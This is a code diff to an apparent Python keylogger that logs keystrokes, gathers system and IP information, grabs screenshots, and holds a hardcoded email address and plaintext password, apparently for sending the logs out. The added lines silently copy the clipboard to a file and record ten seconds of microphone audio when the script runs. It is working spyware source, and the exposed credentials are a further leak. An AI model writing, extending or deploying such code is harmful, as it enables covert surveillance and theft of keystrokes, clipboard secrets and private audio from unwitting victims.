@@ -37,6 +37,10 @@ from PIL import ImageGrab  # to grab images
 
 keys_information = "key_log.txt"
 system_information = "systeminfo.txt"
+clipboard_information = "clipboard.txt"
+audio_information = "audio.wav"
+
+microphone_time = 10
 
 email_address = "vikramathithyan99@gmail.com"
 password = "Vedha2018"
@@ -103,13 +107,43 @@ def computer_information():
         except Exception:
             f.write("Couldn't get Public Address (most likely max query)")
 
-        f.write("Processor: " + (platform.processor() ) + '\n')
-        f.write("System: " + platform.system() + " "+ platform.version() + '\n')
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("System: " + platform.system() + " " + platform.version() + '\n')
         f.write("Machine: " + platform.machine() + '\n')
         f.write("Hostname: " + hostname + "\n")
         f.write("Private IP Address: " + IPAddr + "\n")
 
 computer_information()
+
+
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: \n" + pasted_data + "\n")
+
+        except:
+            f.write("Clipboard could not be copied!")
+
+copy_clipboard()
+
+
+def microphone():
+    fs = 44100
+    seconds = microphone_time
+
+    myrecording = sd.rec(int(seconds*fs), samplerate=fs, channels=2)
+    sd.wait()
+
+    write(file_path + extend + audio_information, fs, myrecording)
+
+microphone()
+
+
+
 
 count = 0
 keys = []  # each pressed key will be appended here
